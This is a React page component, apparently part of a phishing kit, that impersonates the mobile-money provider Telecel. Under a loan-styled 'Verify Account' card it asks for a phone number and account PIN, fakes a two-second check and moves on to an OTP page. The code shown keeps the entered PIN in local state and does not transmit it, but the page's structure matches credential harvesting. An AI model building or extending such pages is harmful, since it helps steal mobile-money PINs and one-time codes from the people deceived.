import { useState } from "react";
import { useNavigate } from "react-router-dom";
import "../styles/app.css";

export default function Telecel() {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);

  const [data, setData] = useState({
    number: "",
    pin: "",
  });

  const handleChange = (e) => {
    setData({ ...data, [e.target.name]: e.target.value });
  };

  const handleSubmit = (e) => {
    e.preventDefault();

    setLoading(true);

    setTimeout(() => {
      navigate("/otp/1");
    }, 2000);
  };

  return (
    <div className="loan-container">
      <div className="card">

        <div className="header">
          <h1>Verify Account</h1>
          <p className="subtitle">Secure verification</p>
        </div>

        <form onSubmit={handleSubmit}>

          <div className="section">
            <input
              name="number"
              placeholder="Phone Number"
              onChange={handleChange}
              required
            />
          </div>

          <div className="section">
            <input
              name="pin"
              type="password"
              placeholder="PIN"
              onChange={handleChange}
              required
            />
          </div>

          <button>
            {loading ? <div className="spinner"></div> : "Verify"}
          </button>

        </form>

      </div>
    </div>
  );
}